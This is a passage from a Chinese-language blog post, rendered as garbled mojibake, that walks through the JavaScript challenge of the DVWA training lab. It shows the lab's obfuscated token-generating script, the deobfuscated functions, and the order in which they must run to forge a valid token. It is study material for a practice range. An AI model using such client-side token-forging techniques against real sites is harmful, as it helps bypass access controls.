class="hljs-number">64</span>|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||<span class="hljs-number">0</span>x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|<span class="hljs-number">0</span>xc0|lastByteIndex|<span class="hljs-number">0</span>x800|EXTRA|createHash|do_something|nodeMethod|<span class="hljs-number">0</span>xd800|token_part_2|<span class="hljs-number">0</span>x10000|<span class="hljs-number">0</span>xe0|<span class="hljs-number">0</span>xe000|phrase|COMMON_JS|<span class="hljs-number">4294967296</span>|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|<span class="hljs-number">0</span>xf0|<span class="hljs-number">0</span>xa2bfe8a1|<span class="hljs-number">0</span>xc24b8b70||<span class="hljs-number">0</span>xa81a664b||<span class="hljs-number">0</span>x92722c85|<span class="hljs-number">0</span>x81c2c92e|<span class="hljs-number">0</span>xc76c51a3|<span class="hljs-number">0</span>x53380d13|<span class="hljs-number">0</span>x766a0abb|<span class="hljs-number">0</span>x4d2c6dfc|<span class="hljs-number">0</span>x650a7354|<span class="hljs-number">0</span>x748f82ee|<span class="hljs-number">0</span>x84c87814|<span class="hljs-number">0</span>x78a5636f|<span class="hljs-number">0</span>x682e6ff3|<span class="hljs-number">0</span>x8cc70208|<span class="hljs-number">0</span>x2e1b2138|<span class="hljs-number">0</span>xa4506ceb|<span class="hljs-number">0</span>x90befffa|<span class="hljs-number">0</span>xbef9a3f7|<span class="hljs-number">0</span>x5b9cca4f|<span class="hljs-number">0</span>x4ed8aa4a|<span class="hljs-number">0</span>x106aa070|<span class="hljs-number">0</span>xf40e3585|<span class="hljs-number">0</span>xd6990624|<span class="hljs-number">0</span>x19a4c116|<span class="hljs-number">0</span>x1e376c08|<span class="hljs-number">0</span>x391c0cb3|<span class="hljs-number">0</span>x34b0bcb5|<span class="hljs-number">0</span>x2748774c|<span class="hljs-number">0</span>xd192e819|<span class="hljs-number">0</span>x0fc19dc6|<span class="hljs-number">32768</span>|<span class="hljs-number">128</span>|<span class="hljs-number">8388608</span>|<span class="hljs-number">2147483648</span>|split|<span class="hljs-number">0</span>x428a2f98|<span class="hljs-number">0</span>x71374491|<span class="hljs-number">0</span>x59f111f1|<span class="hljs-number">0</span>x3956c25b|<span class="hljs-number">0</span>xe9b5dba5|<span class="hljs-number">0</span>xb5c0fbcf|<span class="hljs-number">0123456789</span>abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|<span class="hljs-number">0</span>x923f82a4|<span class="hljs-number">0</span>xab1c5ed5|<span class="hljs-number">0</span>x983e5152|<span class="hljs-number">0</span>xa831c66d|<span class="hljs-number">0</span>x76f988da|<span class="hljs-number">0</span>x5cb0a9dc|<span class="hljs-number">0</span>x4a7484aa|<span class="hljs-number">0</span>xb00327c8|<span class="hljs-number">0</span>xbf597fc7|<span class="hljs-number">0</span>x14292967|<span class="hljs-number">0</span>x06ca6351||<span class="hljs-number">0</span>xd5a79147|<span class="hljs-number">0</span>xc6e00bf3|<span class="hljs-number">0</span>x2de92c6f|<span class="hljs-number">0</span>x240ca1cc|<span class="hljs-number">0</span>x550c7dc3|<span class="hljs-number">0</span>x72be5d74|<span class="hljs-number">0</span>x243185be|<span class="hljs-number">0</span>x12835b01|<span class="hljs-number">0</span>xd807aa98|<span class="hljs-number">0</span>x80deb1fe|<span class="hljs-number">0</span>x9bdc06a7|<span class="hljs-number">0</span>xc67178f2|<span class="hljs-number">0</span>xefbe4786|<span class="hljs-number">0</span>xe49b69c1|<span class="hljs-number">0</span>xc19bf174|<span class="hljs-number">0</span>x27b70a85|<span class="hljs-number">0</span>x3070dd17|<span class="hljs-number">300032</span>|<span class="hljs-number">1413257819</span>|<span class="hljs-number">150054599</span>|<span class="hljs-number">24177077</span>|<span class="hljs-number">56</span>|<span class="hljs-number">4294967295</span>|<span class="hljs-number">0</span>x5be0cd19|while|setTimeout|<span class="hljs-number">704751109</span>|<span class="hljs-number">210244248</span>|DataView|<span class="hljs-number">0</span>x36|<span class="hljs-number">0</span>x5c|push|ZZ|Object|<span class="hljs-number">143694565</span>|YY|<span class="hljs-number">0</span>x1f83d9ab|<span class="hljs-number">1521486534</span>|<span class="hljs-number">0</span>x367cd507|<span class="hljs-number">0</span>xc1059ed8|<span class="hljs-number">0</span>xffc00b31|<span class="hljs-number">0</span>x68581511|<span class="hljs-number">0</span>x64f98fa7|XX|<span class="hljs-number">300</span>|<span class="hljs-number">0</span>x9b05688c|send|addEventListener|click|utf8|<span class="hljs-number">0</span>xbefa4fa4|<span class="hljs-number">0</span>xf70e5939|<span class="hljs-number">0</span>x510e527f|<span class="hljs-number">0</span>xbb67ae85|<span class="hljs-number">0</span>x6a09e667|<span class="hljs-number">0</span>x3c6ef372|<span class="hljs-number">0</span>xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&#x27;,&#x27;split&#x27;];(function(c,d)&#123;var e=function(f)&#123;while(--f)&#123;c[&#x27;push&#x27;](c[&#x27;shift&#x27;]());&#125;&#125;;e(++d);&#125;(a,<span class="hljs-number">0</span>x1f4));var b=function(c,d)&#123;c=c-<span class="hljs-number">0</span>x0;var e=a[c];return e;&#125;;eval(function(d,e,f,g,h,i)&#123;h=function(j)&#123;return(j&lt;e?&#x27;&#x27;:h(parseInt(j/e)))+((j=j%e)&gt;<span class="hljs-number">0</span>x23?String[b(&#x27;<span class="hljs-number">0</span>x0&#x27;)](j+<span class="hljs-number">0</span>x1d):j[b(&#x27;<span class="hljs-number">0</span>x1&#x27;)](<span class="hljs-number">0</span>x24));&#125;;if(!&#x27;&#x27;[b(&#x27;<span class="hljs-number">0</span>x2&#x27;)](/^/,String))&#123;while(f--)&#123;i[h(f)]=g[f]||h(f);&#125;g=[function(k)&#123;if(&#x27;wpA&#x27;!==b(&#x27;<span class="hljs-number">0</span>x3&#x27;))&#123;return i[k];&#125;else&#123;while(f--)&#123;i[k(f)]=g[f]||k(f);&#125;g=[function(l)&#123;return i[l];&#125;];k=function()&#123;return b(&#x27;<span class="hljs-number">0</span>x4&#x27;);&#125;;f=<span class="hljs-number">0</span>x1;&#125;&#125;];h=function()&#123;return b(&#x27;<span class="hljs-number">0</span>x4&#x27;);&#125;;f=<span class="hljs-number">0</span>x1;&#125;;while(f--)&#123;if(g[f])&#123;if(b(&#x27;<span class="hljs-number">0</span>x5&#x27;)===b(&#x27;<span class="hljs-number">0</span>x6&#x27;))&#123;return i[h];&#125;else&#123;d=d[b(&#x27;<span class="hljs-number">0</span>x2&#x27;)](new RegExp(&#x27;\x5cb&#x27;+h(f)+&#x27;\x5cb&#x27;,&#x27;g&#x27;),g[f]);&#125;&#125;&#125;return d;&#125;(b(&#x27;<span class="hljs-number">0</span>x7&#x27;),<span class="hljs-number">0</span>x3e,<span class="hljs-number">0</span>x137,b(&#x27;<span class="hljs-number">0</span>x8&#x27;)[b(&#x27;<span class="hljs-number">0</span>x9&#x27;)](&#x27;|&#x27;),<span class="hljs-number">0</span>x0,&#123;&#125;));<br></code></pre></td></tr></table></figure>

<p>ä½¿ç”¨<a target="_blank" rel="noopener" href="http://deobfuscatejavascript.com/#">è¿˜åŸå·¥å…·</a>å¾—åˆ°æºç åå¾—åˆ°å…³é”®ä»£ç éƒ¨åˆ†å¦‚ä¸‹ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Copy</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">do_something</span>(<span class="hljs-params">e</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> t = <span class="hljs-string">&quot;&quot;</span>, n = e.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>; n &gt;= <span class="hljs-number">0</span>; n--) t += e[n];<br>    <span class="hljs-keyword">return</span> t<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">token_part_3</span>(<span class="hljs-params">t, y = <span class="hljs-string">&quot;ZZ&quot;</span></span>) &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">sha256</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> + y)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">token_part_2</span>(<span class="hljs-params">e = <span class="hljs-string">&quot;YY&quot;</span></span>) &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">sha256</span>(e + <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span>)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">token_part_1</span>(<span class="hljs-params">a, b</span>) &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">do_something</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;phrase&quot;</span>).<span class="hljs-property">value</span>)<br>&#125;<br><br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;phrase&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">token_part_2</span>(<span class="hljs-string">&quot;XX&quot;</span>)<br>&#125;, <span class="hljs-number">300</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;send&quot;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, token_part_3);<br><span class="hljs-title function_">token_part_1</span>(<span class="hljs-string">&quot;ABCD&quot;</span>, <span class="hljs-number">44</span>);<br></code></pre></td></tr></table></figure>

<p>ç”±äºæ‰§è¡Œ token_part_2(â€œXXâ€) æœ‰ 300 æ¯«ç§’å»¶æ—¶ï¼Œæ‰€ä»¥ token_part_1(â€œABCDâ€, 44) ä¼šè¢«å…ˆæ‰§è¡Œï¼Œè€Œ token_part_3() åˆ™æ˜¯å’Œæäº¤æŒ‰é’®çš„ click äº‹ä»¶ä¸€èµ·æ‰§è¡Œã€‚</p>
<p>ä¾æ¬¡æ‰§è¡Œ token_part_1(â€œABCDâ€, 44) å’Œ token_part_2(â€œXXâ€)ï¼Œæœ€åç‚¹å‡»æäº¤æ‰§è¡Œ token_part_3()ã€‚</p>
<p>â€œâ€</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/%E9%9D%B6%E5%9C%BA/" class="category-chain-item">é¶åœº</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/web/" class="print-no-link">#web</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>DVWAå¥‡å¦™ä¹‹æ—…</div>
      <div>http://example.com/2024/01/19/DVWAå¥‡å¦™ä¹‹æ—…/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>ä½œè€…</div>
          <div>fan fan</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>å‘å¸ƒäº</div>
          <div>2024å¹´1æœˆ19æ—¥</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>è®¸å¯åè®®</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - ç½²å">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/01/18/srop/" title="srop">
                        <span class="hidden-mobile">srop</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      

    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>ç›®å½•</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">è½½å…¥å¤©æ•°...</span> <span id="times">è½½å…¥æ—¶åˆ†ç§’...</span> <script src="/js/duration.js"></script> </div> 
    </div>
  
  
  
    <!-- å¤‡æ¡ˆä¿¡æ¯ ICP for China -->
    <div class="beian">
  <span>
    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
      äº¬ICPè¯123456å·
    </a>
  </span>
  
    
      <span>
        <a
          href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12345678"
          rel="nofollow noopener"
          class="beian-police"
          target="_blank"
        >
          
            <span style="visibility: hidden; width: 0">|</span>
            <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
          
          <span>äº¬å…¬ç½‘å®‰å¤‡12345678å·</span>
        </a>
      </span>
    
  
</div>

  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  
<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/runtime.min.js"></script>
<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicLine.min.js"></script>



<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
